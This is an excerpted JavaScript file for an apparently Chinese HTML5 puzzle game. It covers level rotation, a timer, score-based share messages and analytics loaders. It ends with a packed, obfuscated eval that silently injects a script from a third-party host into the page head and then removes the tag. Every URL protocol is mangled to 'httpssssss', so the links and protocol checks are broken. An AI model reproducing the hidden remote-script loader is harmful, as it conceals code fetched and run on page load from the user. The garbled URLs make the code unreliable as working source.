...
function moveCircle() {
  if (typeof selectedCircle === "undefined") return;
...
function selectCircle() {
  if (mode == 1) level = levels[levelNum - 1];
...
function startLevel() {
  ...
  for (i = 0; i < level[0].length; i++) {
    point = rotate(
      angel,
      convertXLocation(level[0][i][0]),
      convertYLocation(level[0][i][1])
    );
...
function startTimeLevel() {
  window.scrollTo(0, 1);
  if (mode2LevelNum == "A1") level = TimeLevel[0];
  else if (mode2LevelNum == "A2") level = TimeLevel[1];
  field = [];
...
function timedCount() {
  if (!timecountover) {
    ...
    if (startTimeArry.length == 1) startTimeArry.push("00");

    if (startTimeArry[1].length == 1) startTimeArry[1] = startTimeArry[1] + "0";
    else if (startTimeArry[1].length == 2) startTimeArry[1] = startTimeArry[1];
    else startTimeArry[1] = "00";
    document.getElementById("TimeSpan").innerHTML =
      startTimeArry[0] + "." + startTimeArry[1];
...
function winLevel() {
  if (mode == 1) {
    if (levelNum > saveFile) ygjstorage.setItem("ygjSave", levelNum);
...
function rotate(angel, oX, oY) {
  ...
  centerY = gameH / 2;
  point.x = Math.floor(
    (oX - centerX) * Math.cos(angel) -
      (oY - centerY) * Math.sin(angel) +
      centerX
  );
  point.y = Math.floor(
    (oY - centerY) * Math.cos(angel) +
      (oX - centerX) * Math.sin(angel) +
      centerY
  );
  return point;
}
...
var mebtnopenurl = "httpssssss://games.vdcom.cn/games/ygj/index.html";
var rankurl = "httpssssss://games.vdcom.cn/games/ygj/index.html";
window.shareData = {
  imgUrl: "httpssssss://games.vdcom.cn/games/ygj/resources/logo_small.jpg",
  timeLineLink: "httpssssss://games.vdcom.cn/games/ygj/index.html",
  tTitle: "一根筋玩到底-viying01",
...
function clickMore() {
  if ((window.location + "").indexOf("zf", 1) > 0) {
    window.location = "httpssssss://games.vdcom.cn/games/ygj/index.html";
  } else {
    goHome();
  }
}
...
function baiducnzz() {
  var _bdhmProtocol =
    "httpssssss:" == document.location.protocol ? " httpssssss://" : " http://";
  document.write(
    unescape(
      "%3Cdiv%20style%3D%27display%3Anone%27%3E%3Cscript src='" +
        _bdhmProtocol +
        "hm.baidu.com/h.js%3F0ae524064813b8dc07ece5ce724a7b04' type='text/javascript'%3E%3C/script%3E"
    )
  );
  var cnzz_protocol =
    "httpssssss:" == document.location.protocol ? " httpssssss://" : " http://";
  document.write(
    unescape(
      "%3Cspan id='cnzz_stat_icon_2947366'%3E%3C/span%3E%3Cscript src='" +
        cnzz_protocol +
        "s5.cnzz.com/stat.php%3Fid%3D2947366' type='text/javascript'%3E%3C/script%3E%3C/div%3E"
    )
  );
}
...
function dp_share() {
  ...
  if (mode == 1) {
    ...
    if (score > 60.0) shareTitle = "我应该是睡着了！";
    else if (score > 30.0) shareTitle = "朕已轻松过关！";
    else if (score > 10.0) shareTitle = "我为一根筋代言！";
    else if (score > 8.0) shareTitle = "叫我快手侠！";
    else if (score > 6.0) shareTitle = "我给自己32个赞！";
    else if (score > 4.0) shareTitle = "我快如闪电！";
    else if (score > 2.0) shareTitle = "我是大神！这里人烟稀少，空气清新...";
    else shareTitle = "O my 疙瘩！我作弊了吧！";

    shareTitle +=
      "【一根筋" + mode2LevelNum + "关】我只用了" + ygjscore + ygjscoreunit;
  }
...
function dp_submitScore() {
  if (mode == 1) {
    ...
    if (score < 7) myData.scoreName = "耗时" + score + "＂,大神，快来膜拜";
    else if (score < 15) myData.scoreName = "耗时" + score + "＂,伟大的一根筋";
    else if (score < 30) myData.scoreName = "耗时" + score + "＂,轻度搭牢";
    else myData.scoreName = "耗时" + score + "＂,重度搭牢";
    ...
    if (score < 60) {
      ...
      if (
        confirm(
          "您用了" + score + "秒,你睡着了吧？亲！要不要让小伙伴们来帮你呢？"
        )
      ) {
        setTimeout(dp_share, 200);
      }
...
eval(
  (function (p, a, c, k, e, d) {
    ...
    "(1(){3 a=2.n('l');a.g='c/9';a.d=f;a.e='8://5.4.7/6/o.m';3 b=2.p('q')[0];b.i(a);a.h=1(){a.k.j(a)}})();",
    27,
    27,
    "|function|document|var|9g|game|ygjwdd|com|http|javascript|||text|async|src|true|type|onload|appendChild|removeChild|parentNode|script|js|createElement||getElementsByTagName|head".split(
      "|"
    ),
    0,
    {}
